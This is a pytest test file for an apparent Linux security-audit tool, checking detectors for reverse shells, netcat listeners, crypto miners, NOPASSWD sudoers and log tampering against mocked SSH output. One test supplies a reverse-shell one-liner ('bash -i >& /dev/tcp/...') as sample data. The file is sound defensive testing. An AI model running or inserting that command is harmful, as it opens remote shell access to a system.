import pytest
from unittest.mock import Mock, MagicMock
from linux_health.checks import (
    CheckResult,
    SystemInfo,
    DetailedSecurityInfo,
    gather_system_info,
    run_all_checks,
    gather_rkhunter_scan,
    gather_unused_packages,
    check_suspicious_network_connections,
    check_hidden_files_in_system_dirs,
    check_kernel_module_integrity,
    check_active_reverse_shells,
    check_weak_password_policy,
    check_container_escape_indicators,
    check_arp_spoofing,
    check_dns_tampering,
    check_crypto_miners,
    check_file_integrity_critical_binaries,
    check_log_tampering,
    check_privilege_escalation_vectors,
    check_world_writable_system_files,
    check_deleted_file_handles,
)
from linux_health.cli import parse_ports, build_parser
from linux_health.scanner import COMMON_PORTS, PortStatus
from linux_health.report import render_report_text, render_report


class TestParsePortsUtil:
    """Tests for port parsing utility"""

    def test_parse_ports_with_none_returns_common_ports(self):
        """Test that None returns default common ports"""
        result = parse_ports(None)
        assert result == COMMON_PORTS

    def test_parse_ports_with_empty_string_returns_common_ports(self):
        """Test that empty string returns default common ports"""
        result = parse_ports("")
        assert result == COMMON_PORTS

    def test_parse_ports_with_single_port(self):
        """Test parsing a single port"""
        result = parse_ports("8080")
        assert result == [8080]

    def test_parse_ports_with_multiple_ports(self):
        """Test parsing multiple comma-separated ports"""
        result = parse_ports("22,80,443")
        assert result == [22, 80, 443]

    def test_parse_ports_with_whitespace(self):
        """Test parsing ports with extra whitespace"""
        result = parse_ports("22, 80, 443")
        assert result == [22, 80, 443]

    def test_parse_ports_with_invalid_port_raises_error(self):
        """Test that invalid port raises ArgumentTypeError"""
        from argparse import ArgumentTypeError

        with pytest.raises(ArgumentTypeError):
            parse_ports("invalid,22")


class TestRenderReportPorts:
    """Tests for port scan rendering behavior"""

    def _base_system(self):
        return SystemInfo(
            hostname="example",
            kernel="5.15",
            os="Ubuntu",
            uptime="1 day",
            users="1",
        )

    def test_text_report_omits_closed_ports(self):
        system = self._base_system()
        ports = [
            PortStatus(port=22, open=True, reason="Connected"),
            PortStatus(port=80, open=False, reason="timeout"),
        ]

        report = render_report_text(system, [], ports)

        assert "Port    22" in report
        assert "Port    80" not in report
        assert "closed/filtered" not in report

    def test_markdown_report_summarizes_when_no_open_ports(self):
        system = self._base_system()
        ports = [PortStatus(port=25, open=False, reason="timeout")]

        report = render_report(system, [], ports)

        assert "| none | closed/filtered" in report
        assert "| 25 |" not in report

    def test_text_report_shows_summary_when_no_open_ports(self):
        system = self._base_system()
        ports = [PortStatus(port=25, open=False, reason="timeout")]

        report = render_report_text(system, [], ports)

        assert "No open ports found" in report
        assert "Port    25" not in report


class TestBuildParser:
    """Tests for CLI argument parser"""

    def test_parser_accepts_hostname_and_username(self):
        """Test parser accepts required hostname and username arguments"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.hostname == "localhost"
        assert args.username == "root"

    def test_parser_has_default_port_22(self):
        """Test parser has default SSH port of 22"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.port == 22

    def test_parser_accepts_custom_port(self):
        """Test parser accepts custom SSH port"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--port", "2222"])
        assert args.port == 2222

    def test_parser_format_defaults_to_text(self):
        """Test output format defaults to text"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.format == "text"

    def test_parser_accepts_markdown_format(self):
        """Test parser accepts markdown output format"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--format", "md"])
        assert args.format == "md"

    def test_parser_asks_for_password(self):
        """Test parser recognizes ask-password flag"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--ask-password"])
        assert args.ask_password is True

    def test_parser_enable_rootkit_scan(self):
        """Test parser recognizes enable-rootkit-scan flag"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--enable-rootkit-scan"]
        )
        assert args.enable_rootkit_scan is True

    def test_parser_rootkit_scan_defaults_to_false(self):
        """Test that rootkit scan is disabled by default"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.enable_rootkit_scan is False

    def test_parser_check_package_hygiene(self):
        """Test parser recognizes check-package-hygiene flag"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--check-package-hygiene"]
        )
        assert args.check_package_hygiene is True

    def test_parser_package_hygiene_defaults_to_false(self):
        """Test that package hygiene check is disabled by default"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.check_package_hygiene is False


class TestCheckResult:
    """Tests for CheckResult dataclass"""

    def test_check_result_creation(self):
        """Test creating a CheckResult"""
        result = CheckResult(
            category="Security",
            item="Password Policy",
            status="pass",
            details="Strong password policy enforced",
            recommendation="Keep current settings",
        )
        assert result.category == "Security"
        assert result.status == "pass"
        assert result.item == "Password Policy"

    def test_check_result_with_warning(self):
        """Test CheckResult with warning status"""
        result = CheckResult(
            category="Updates",
            item="System Updates",
            status="warn",
            details="Updates available",
            recommendation="Apply security updates",
        )
        assert result.status == "warn"


class TestSystemInfo:
    """Tests for SystemInfo dataclass"""

    def test_system_info_creation(self):
        """Test creating SystemInfo"""
        info = SystemInfo(
            hostname="ubuntu",
            os="Ubuntu 22.04",
            kernel="5.15.0",
            uptime="30 days",
            users="2 users",
        )
        assert info.hostname == "ubuntu"
        assert info.os == "Ubuntu 22.04"
        assert info.kernel == "5.15.0"


class TestDetailedSecurityInfo:
    """Tests for DetailedSecurityInfo dataclass"""

    def test_security_info_creation(self):
        """Test creating DetailedSecurityInfo"""
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
        )
        assert info.suid_binaries == "5 found"
        assert info.firewall_rules == "iptables: 20 rules"

    def test_security_info_with_rootkit_scan(self):
        """Test creating DetailedSecurityInfo with rkhunter results"""
        rkhunter_output = "Rootkit Hunter version 1.4.6\n[OK] No rootkits detected"
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
            rootkit_scan=rkhunter_output,
        )
        assert info.rootkit_scan == rkhunter_output
        assert "rootkits" in info.rootkit_scan.lower()

    def test_security_info_with_unused_packages(self):
        """Test creating DetailedSecurityInfo with unused packages info"""
        packages_info = "=== Orphaned/Autoremovable Packages ===\nRemov python3-dev"
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
            unused_packages=packages_info,
        )
        assert info.unused_packages == packages_info
        assert "python" in info.unused_packages.lower()


class TestGatherSystemInfo:
    """Tests for gather_system_info function"""

    def test_gather_system_info_with_mock_ssh(self):
        """Test gathering system info with mocked SSH session"""
        # Create mock SSH session
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "ubuntu\n", ""),  # hostname
                (0, "5.15.0-107\n", ""),  # kernel
                (0, "Ubuntu 22.04.5 LTS\n", ""),  # os
                (0, "up 30 days\n", ""),  # uptime
                (0, "2\n", ""),  # users
            ]
        )

        info = gather_system_info(mock_ssh)
        assert info.hostname == "ubuntu\n"
        assert "Ubuntu" in info.os


class TestRunAllChecks:
    """Tests for run_all_checks function"""

    def test_run_all_checks_returns_list(self):
        """Test that run_all_checks returns a list of CheckResult objects"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "test output", ""))

        results = run_all_checks(mock_ssh, password="")
        assert isinstance(results, list)
        assert all(isinstance(r, CheckResult) for r in results)

    def test_run_all_checks_has_results(self):
        """Test that run_all_checks returns at least some results"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "test output", ""))

        results = run_all_checks(mock_ssh, password="")
        assert len(results) > 0


class TestGatherRkhunterScan:
    """Tests for gather_rkhunter_scan function"""

    def test_rkhunter_not_installed_returns_none(self):
        """Test that None is returned when rkhunter is not installed"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "not_found", ""))

        result = gather_rkhunter_scan(mock_ssh)
        assert result is None

    def test_rkhunter_installed_and_scan_successful(self):
        """Test successful rkhunter scan"""
        mock_ssh = Mock()
        scan_output = "Rootkit Hunter version 1.4.6\n[OK] No rootkits detected\n[OK] All checks passed"
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (0, scan_output, ""),  # actual scan
            ]
        )

        result = gather_rkhunter_scan(mock_ssh)
        assert result is not None
        assert "Rootkit Hunter" in result or "rootkit" in result.lower()

    def test_rkhunter_scan_with_password(self):
        """Test rkhunter scan with sudo password"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (0, "[OK] No rootkits detected", ""),  # actual scan with sudo
            ]
        )

        result = gather_rkhunter_scan(mock_ssh, password="test_password")
        assert result is not None
        assert "OK" in result or "rootkit" in result.lower()

    def test_rkhunter_scan_failure_returns_error_message(self):
        """Test rkhunter scan failure handling"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (1, "", "rkhunter command failed"),  # scan fails
            ]
        )

        result = gather_rkhunter_scan(mock_ssh)
        assert result == "rkhunter scan failed or produced no output"


class TestCheckStaleUserAccounts:
    """Tests for stale user account detection"""

    def test_stale_user_check_returns_result(self):
        """Test that stale user account check returns a CheckResult"""
        from linux_health.checks import check_stale_user_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_stale_user_accounts(mock_ssh)
        assert result is not None
        assert hasattr(result, "status")
        assert result.status in ["pass", "warn", "fail"]

    def test_no_stale_users_returns_pass(self):
        """Test when no stale users found"""
        from linux_health.checks import check_stale_user_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_stale_user_accounts(mock_ssh)
        assert result.status == "pass"


class TestCheckAbnormalNetworkProcesses:
    """Tests for abnormal network process detection"""

    def test_normal_services_returns_pass(self):
        """Test that normal services return PASS"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        # Simulate normal listening services (ssh, http, dns)
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=5678,fd=5))
LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=5678,fd=6))
LISTEN 0 128 127.0.0.1:53 0.0.0.0:* users:(("dnsmasq",pid=9999,fd=10))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_netcat_detected(self):
        """Test detection of netcat listener"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:9999 0.0.0.0:* users:(("nc",pid=6789,fd=4))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "warn"
        assert "nc" in result.details.lower() or "netcat" in result.details.lower()

    def test_suspicious_shell_detected(self):
        """Test detection of shell listening"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("bash",pid=7890,fd=5))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "warn"
        assert (
            "bash" in result.details.lower()
            or "reverse shell" in result.details.lower()
        )

    def test_no_listeners_returns_pass(self):
        """Test when no listeners found"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"

    def test_command_failure_returns_pass(self):
        """Test graceful handling of command failure"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Command error"))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"


class TestGatherUnusedPackages:
    """Tests for gather_unused_packages function"""

    def test_unused_packages_apt_system(self):
        """Test package hygiene check on apt-based system"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "Remov python3-pip python3-dev\n", ""),  # autoremovable packages
                (0, "build-essential\ngcc\n", ""),  # dev packages
                (0, "", ""),  # bloat packages
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result is not None
        assert (
            "apt" not in result
            or "orphan" in result.lower()
            or "build" in result.lower()
        )

    def test_unused_packages_no_packages(self):
        """Test when no unused packages found"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "", ""),  # no autoremovable
                (0, "", ""),  # no dev packages
                (0, "", ""),  # no bloat
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result == "No obvious unused packages detected"

    def test_unused_packages_yum_system(self):
        """Test package hygiene check on yum-based system"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "yum\n", ""),  # detect package manager
                (0, "package-cleanup output\n", ""),  # cleanup output
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result is not None

    def test_unused_packages_unknown_manager(self):
        """Test handling of unknown package manager"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "unknown\n", ""))

        result = gather_unused_packages(mock_ssh)
        assert result == "Package manager not detected (apt/yum not found)"

    def test_unused_packages_with_password(self):
        """Test package hygiene with sudo password"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "Remov package1\n", ""),  # autoremovable with sudo
                (0, "", ""),  # no dev packages
                (0, "", ""),  # no bloat
            ]
        )

        result = gather_unused_packages(mock_ssh, password="test_pass")
        assert result is not None


class TestCheckSuspiciousProcessLocations:
    """Tests for suspicious process location detection"""

    def test_no_suspicious_processes_returns_pass(self):
        """Test when no processes in suspicious locations"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_suspicious_process_locations(mock_ssh)
        assert result.status == "pass"

    def test_process_in_tmp_detected(self):
        """Test detection of process in /tmp"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        output = "bash    1234 user    0r   REG  ... /tmp/malware"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_suspicious_process_locations(mock_ssh)
        assert result.status == "warn"

    def test_command_failure_returns_pass(self):
        """Test graceful failure handling"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Command not found"))

        result = check_suspicious_process_locations(mock_ssh)
        assert result.status == "pass"


class TestCheckUnexpectedSudoUsage:
    """Tests for unexpected sudo usage detection"""

    def test_normal_sudoers_returns_pass(self):
        """Test with normal sudoers configuration"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "No sudoers.d files", ""),  # no special sudoers
                (0, "", ""),  # no suspicious sudo commands
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "pass"

    def test_nopasswd_sudoers_detected(self):
        """Test detection of NOPASSWD sudoers"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "ALL=(ALL) NOPASSWD: ALL", ""),  # dangerous NOPASSWD
                (0, "", ""),
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "warn"
        assert "NOPASSWD" in result.details or "no password" in result.details.lower()

    def test_suspicious_sudo_commands_detected(self):
        """Test detection of suspicious sudo commands"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "", ""),
                (0, "sudo COMMAND=/bin/bash", ""),  # bash via sudo
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "warn"


class TestCheckRecentlyCreatedAccounts:
    """Tests for recently created account detection"""

    def test_no_recent_accounts_returns_pass(self):
        """Test when no recent accounts exist"""
        from linux_health.checks import check_recently_created_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "pass"

    def test_recent_account_detected(self):
        """Test detection of recently created account"""
        from linux_health.checks import check_recently_created_accounts
        from datetime import datetime, timedelta

        now = datetime.now()
        recent_date = now - timedelta(days=5)
        date_str = recent_date.strftime("%Y-%m-%d %H:%M:%S")

        mock_ssh = Mock()
        output = f"{date_str}.123456+00:00|backdoor_user"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "warn"
        assert "recently created" in result.item.lower()

    def test_old_account_returns_pass(self):
        """Test that old accounts return pass"""
        from linux_health.checks import check_recently_created_accounts
        from datetime import datetime, timedelta

        now = datetime.now()
        old_date = now - timedelta(days=90)
        date_str = old_date.strftime("%Y-%m-%d %H:%M:%S")

        mock_ssh = Mock()
        output = f"{date_str}.123456+00:00|olduser"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "pass"


class TestCheckSystemBinaryModifications:
    """Tests for system binary modification detection"""

    def test_no_modified_binaries_returns_pass(self):
        """Test when no binaries modified"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "pass"

    def test_modified_binary_detected(self):
        """Test detection of recently modified binary"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "/bin/bash", ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "warn"
        assert "binary" in result.item.lower() or "modified" in result.item.lower()

    def test_multiple_modified_binaries_detected(self):
        """Test detection of multiple modified binaries"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        output = "/bin/bash\n/usr/bin/sudo\n/sbin/init"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "warn"
        assert "3" in result.details


class TestCheckFailedLoginSpike:
    """Tests for failed login spike detection"""

    def test_normal_failed_logins_returns_pass(self):
        """Test with normal number of failed logins"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "5", ""),  # 5 failed logins
                (0, "", ""),  # no IPs
            ]
        )

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "pass"

    def test_high_failed_logins_returns_warn(self):
        """Test detection of high failed login count"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "50", ""),  # 50 failed logins
                (0, "192.168.1.100\n192.168.1.101", ""),  # attacking IPs
            ]
        )

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "warn"
        assert "50" in result.details or "spike" in result.item.lower()

    def test_command_failure_returns_pass(self):
        """Test graceful handling of auth log unavailability"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Permission denied"))

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "pass"


class TestSuspiciousNetworkConnections:
    """Tests for suspicious network connections check"""

    def test_no_external_connections_passes(self):
        """Test that no external connections passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_suspicious_network_connections(mock_ssh)
        assert result.status == "pass"

    def test_many_external_connections_fails(self):
        """Test that many external connections fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "60", ""))

        result = check_suspicious_network_connections(mock_ssh)
        assert result.status == "fail"
        assert "60" in result.details


class TestHiddenFilesInSystemDirs:
    """Tests for hidden files in system directories check"""

    def test_no_hidden_files_passes(self):
        """Test that no hidden files passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_hidden_files_in_system_dirs(mock_ssh)
        assert result.status == "pass"

    def test_many_hidden_files_fails(self):
        """Test that many hidden files fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "10", ""), (0, "/tmp/.backdoor\n/var/tmp/.malware", "")]
        )

        result = check_hidden_files_in_system_dirs(mock_ssh)
        assert result.status == "fail"


class TestKernelModuleIntegrity:
    """Tests for kernel module integrity check"""

    def test_normal_modules_passes(self):
        """Test that normal module count passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "", "")])

        result = check_kernel_module_integrity(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_modules_fails(self):
        """Test that suspicious modules fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "evil_module", "")])

        result = check_kernel_module_integrity(mock_ssh)
        assert result.status == "fail"


class TestActiveReverseShells:
    """Tests for reverse shell detection"""

    def test_no_reverse_shells_passes(self):
        """Test that no reverse shells detected passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_active_reverse_shells(mock_ssh)
        assert result.status == "pass"

    def test_reverse_shell_detected_fails(self):
        """Test that detected reverse shell fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            return_value=(0, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "")
        )

        result = check_active_reverse_shells(mock_ssh)
        assert result.status == "fail"


class TestWeakPasswordPolicy:
    """Tests for weak password policy check"""

    def test_no_password_policy_fails(self):
        """Test that no password policy fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_weak_password_policy(mock_ssh)
        assert result.status == "fail"

    def test_password_policy_configured_passes(self):
        """Test that configured password policy passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "minlen = 12\ndcredit = -1", ""))

        result = check_weak_password_policy(mock_ssh)
        assert result.status == "pass"


class TestContainerEscapeIndicators:
    """Tests for container escape detection"""

    def test_not_in_container_passes(self):
        """Test that not being in container passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "none", ""),
                (0, "0", ""),
                (0, "restricted", ""),
                (0, "0", ""),
            ]
        )

        result = check_container_escape_indicators(mock_ssh)
        assert result.status == "pass"

    def test_privileged_container_fails(self):
        """Test that privileged container fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "docker", ""), (0, "0", ""), (0, "privileged", "")]
        )

        result = check_container_escape_indicators(mock_ssh)
        assert result.status == "fail"


class TestARPSpoofing:
    """Tests for ARP spoofing detection"""

    def test_no_duplicates_passes(self):
        """Test that no duplicate MACs passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "", ""), (0, "10", "")])

        result = check_arp_spoofing(mock_ssh)
        assert result.status == "pass"

    def test_duplicate_macs_fails(self):
        """Test that duplicate MACs fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "aa:bb:cc:dd:ee:ff", ""))

        result = check_arp_spoofing(mock_ssh)
        assert result.status == "fail"


class TestDNSTampering:
    """Tests for DNS tampering detection"""

    def test_normal_dns_passes(self):
        """Test that normal DNS configuration passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "8.8.8.8\n8.8.4.4", ""))

        result = check_dns_tampering(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_dns_fails(self):
        """Test that suspicious DNS fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0.0.0.0", ""))

        result = check_dns_tampering(mock_ssh)
        assert result.status == "fail"


class TestCryptoMiners:
    """Tests for cryptocurrency miner detection"""

    def test_no_miners_passes(self):
        """Test that no miners detected passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "", ""), (0, "", ""), (0, "25.5", "")]
        )

        result = check_crypto_miners(mock_ssh)
        assert result.status == "pass"

    def test_miner_process_fails(self):
        """Test that miner process detection fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "xmrig --donate-level 0", ""))

        result = check_crypto_miners(mock_ssh)
        assert result.status == "fail"


class TestFileIntegrityCriticalBinaries:
    """Tests for critical binary integrity"""

    def test_unmodified_binaries_passes(self):
        """Test that unmodified binaries pass"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "", ""), (0, "-rwxr-xr-x /bin/bash", "")]
        )

        result = check_file_integrity_critical_binaries(mock_ssh)
        assert result.status == "pass"

    def test_recently_modified_binaries_fails(self):
        """Test that recently modified binaries fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "/bin/bash\n/usr/bin/sudo", ""),
                (0, "-rwxr-xr-x /bin/bash", ""),
            ]
        )

        result = check_file_integrity_critical_binaries(mock_ssh)
        assert result.status == "fail"


class TestLogTampering:
    """Tests for log tampering detection"""

    def test_normal_logs_passes(self):
        """Test that normal log files pass"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "500", ""), (0, "1000", "")])

        result = check_log_tampering(mock_ssh)
        assert result.status == "pass"

    def test_empty_logs_fails(self):
        """Test that empty logs fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_log_tampering(mock_ssh)
        assert result.status == "fail"


class TestPrivilegeEscalationVectors:
    """Tests for privilege escalation detection"""

    def test_no_vectors_passes(self):
        """Test that no escalation vectors passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "", ""),  # no NOPASSWD entries
                (0, "", ""),  # no dangerous capabilities
                (0, "protected", ""),  # /etc/passwd not writable
                (0, "sudo version 1.9.10p1", ""),  # safe sudo version
            ]
        )

        result = check_privilege_escalation_vectors(mock_ssh)
        assert result.status == "pass"

    def test_nopasswd_sudo_warns(self):
        """Test that NOPASSWD sudo warns"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "user ALL=(ALL) NOPASSWD: ALL", ""),
                (0, "", ""),
                (0, "protected", ""),
                (0, "Sudo version 1.9.10", ""),
            ]
        )

        result = check_privilege_escalation_vectors(mock_ssh)
        assert result.status in ["warn", "fail"]


class TestWorldWritableSystemFiles:
    """Tests for world-writable files check"""

    def test_no_writable_files_passes(self):
        """Test that no world-writable files passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_world_writable_system_files(mock_ssh)
        assert result.status == "pass"

    def test_writable_files_fails(self):
        """Test that world-writable files fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            return_value=(0, "/usr/bin/bad_file\n/etc/writable_config", "")
        )

        result = check_world_writable_system_files(mock_ssh)
        assert result.status == "fail"


class TestDeletedFileHandles:
    """Tests for deleted file handles check"""

    def test_no_deleted_handles_passes(self):
        """Test that no deleted file handles passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_deleted_file_handles(mock_ssh)
        assert result.status == "pass"

    def test_deleted_handles_warns(self):
        """Test that deleted file handles warn"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "suspicious 1234 /tmp/.deleted", ""))

        result = check_deleted_file_handles(mock_ssh)
        assert result.status == "warn"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
